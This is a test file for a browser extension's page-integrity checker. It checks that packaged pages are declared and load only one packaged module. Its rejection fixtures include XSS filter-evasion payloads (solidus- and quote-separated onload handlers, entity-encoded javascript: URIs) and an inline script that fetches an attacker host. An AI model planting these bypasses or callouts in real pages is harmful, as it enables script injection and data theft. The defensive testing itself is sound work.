/**
 * MCW-V09-131: the manifest gate integrity-checked only the two pages the
 * manifest happens to name, so `onboarding.html`, `popup.html`, and
 * `ledger-grant.html` shipped in the extension origin with no check that they
 * load one packaged module and carry no inline handler.
 *
 * These tests pin the declaration (every packaged page is listed, and its module
 * is packaged too) and the integrity rule (one declared script tag, no inline
 * event handler, no `javascript:` URI) for every shipped page.
 */
import { describe, expect, test } from "bun:test";
import { readFile } from "node:fs/promises";
import {
  decodeCharacterReferences,
  manifestPageDeclarationFailures,
  PACKAGED_PAGES,
  packagedModulePath,
  packagedPageDeclarationFailures,
  packagedPageFailures,
} from "../../scripts/check-extension-manifest";
import { EXPECTED_RUNTIME_FILES } from "../../scripts/extension-runtime-files";

const page = (path: string, module: string) => ({ module, path });

describe("packaged page declaration", () => {
  test("declares every page in the packaged file set", () => {
    expect(packagedPageDeclarationFailures(EXPECTED_RUNTIME_FILES)).toEqual([]);
  });

  test("covers the privileged pages the manifest never names", () => {
    const declared = PACKAGED_PAGES.map((entry) => entry.path);
    expect(declared).toContain("onboarding.html");
    expect(declared).toContain("popup.html");
    expect(declared).toContain("ledger-grant.html");
  });

  test("flags a packaged page that is not declared", () => {
    expect(packagedPageDeclarationFailures([...EXPECTED_RUNTIME_FILES, "debug.html"])).toEqual([
      "debug.html is packaged but not declared in PACKAGED_PAGES",
    ]);
  });

  test("flags a declared page whose module is not packaged", () => {
    const withoutLedgerModule = EXPECTED_RUNTIME_FILES.filter(
      (file) => file !== "ledger-grant/index.js",
    );
    expect(packagedPageDeclarationFailures(withoutLedgerModule)).toEqual([
      "ledger-grant.html must load a packaged module, not ledger-grant/index.js",
    ]);
  });

  test("accepts the pages this repository's manifest names", () => {
    expect(manifestPageDeclarationFailures(["sidepanel.html", "sandbox/render.html"])).toEqual([]);
  });

  test("flags a manifest page the page table never declares", () => {
    // A manifest that ever named a different page would otherwise point at a
    // page no integrity rule inspects.
    expect(manifestPageDeclarationFailures(["sidepanel-v2.html"])).toEqual([
      "sidepanel-v2.html is named by the manifest but not declared in PACKAGED_PAGES",
    ]);
  });

  test("resolves a page module relative to the page's own directory", () => {
    expect(packagedModulePath(page("sandbox/render.html", "./render.js"))).toBe(
      "sandbox/render.js",
    );
    expect(packagedModulePath(page("popup.html", "./sidepanel/index.js"))).toBe(
      "sidepanel/index.js",
    );
  });
});

describe("character reference decoding", () => {
  test("decodes the forms a browser resolves in an attribute value", () => {
    expect(decodeCharacterReferences("&#106;avascript&colon;")).toBe("javascript:");
    expect(decodeCharacterReferences("&#x6a;avascript:")).toBe("javascript:");
    expect(decodeCharacterReferences("java&#10;script:")).toBe("java\nscript:");
  });

  test("leaves unknown and out-of-range references verbatim", () => {
    expect(decodeCharacterReferences("&nope;")).toBe("&nope;");
    expect(decodeCharacterReferences("&#1114112;")).toBe("&#1114112;");
  });

  test("does not decode a reference it produced itself", () => {
    expect(decodeCharacterReferences("&amp;colon;")).toBe("&colon;");
  });
});

describe("packaged page integrity", () => {
  test("accepts every page shipped in this repository", async () => {
    for (const entry of PACKAGED_PAGES) {
      const html = await readFile(`public/${entry.path}`, "utf8");
      expect(packagedPageFailures(entry, html)).toEqual([]);
    }
  });

  const onboarding = page("onboarding.html", "./sidepanel/index.js");
  const shell = (body: string): string =>
    `<!doctype html>\n<html lang="en">\n<head><meta charset="utf-8" /></head>\n${body}\n</html>\n`;

  test("rejects an inline event handler on a runtime-opened page", () => {
    const html = shell(
      '<body onload="steal()"><main id="app"></main>\n<script type="module" src="./sidepanel/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must not carry inline event handlers or javascript: URIs",
    ]);
  });

  test("rejects a handler separated by a solidus, which the tokenizer accepts", () => {
    // `<body class="x"/onload="…">` runs: U+002F inside a tag is an attribute
    // separator (unexpected-solidus-in-tag reconsumes in before-attribute-name),
    // so a rule anchored on whitespace alone sees nothing.
    const html = shell(
      '<body class="onboarding-surface"/onload="steal()"><main id="app"></main>\n<script type="module" src="./sidepanel/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must not carry inline event handlers or javascript: URIs",
    ]);
  });

  test("rejects a handler separated only by the previous attribute's quote", () => {
    // A quoted value followed straight by a name is missing-whitespace-between-
    // attributes: a parse error the tokenizer recovers from by parsing both.
    const html = shell(
      '<body class="onboarding-surface"onload="steal()"><main id="app"></main>\n<script type="module" src="./sidepanel/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must not carry inline event handlers or javascript: URIs",
    ]);
  });

  test("rejects an entity-encoded javascript: URI", () => {
    const html = shell(
      '<body><a href="&#106;avascript:steal()">go</a>\n<script type="module" src="./sidepanel/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must not carry inline event handlers or javascript: URIs",
    ]);
  });

  test("rejects a javascript: URI split by a named or control reference", () => {
    for (const scheme of ["javascript&colon;", "java&#10;script:", "java&Tab;script:"]) {
      const html = shell(
        `<body><a href="${scheme}steal()">go</a>\n<script type="module" src="./sidepanel/index.js"></script></body>`,
      );
      expect({ scheme, failures: packagedPageFailures(onboarding, html) }).toEqual({
        scheme,
        failures: ["onboarding.html must not carry inline event handlers or javascript: URIs"],
      });
    }
  });

  test("rejects a second, unpackaged script tag", () => {
    const html = shell(
      '<body><main id="app"></main>\n<script type="module" src="./sidepanel/index.js"></script>\n<script>fetch("https://attacker.invalid")</script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must load only the packaged module ./sidepanel/index.js",
    ]);
  });

  test("rejects a page that loads a different module", () => {
    const html = shell(
      '<body><main id="app"></main>\n<script type="module" src="./other/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must load only the packaged module ./sidepanel/index.js",
    ]);
  });

  test("rejects a javascript: URI", () => {
    const html = shell(
      '<body><a href="javascript:steal()">go</a>\n<script type="module" src="./sidepanel/index.js"></script></body>',
    );
    expect(packagedPageFailures(onboarding, html)).toEqual([
      "onboarding.html must not carry inline event handlers or javascript: URIs",
    ]);
  });
});
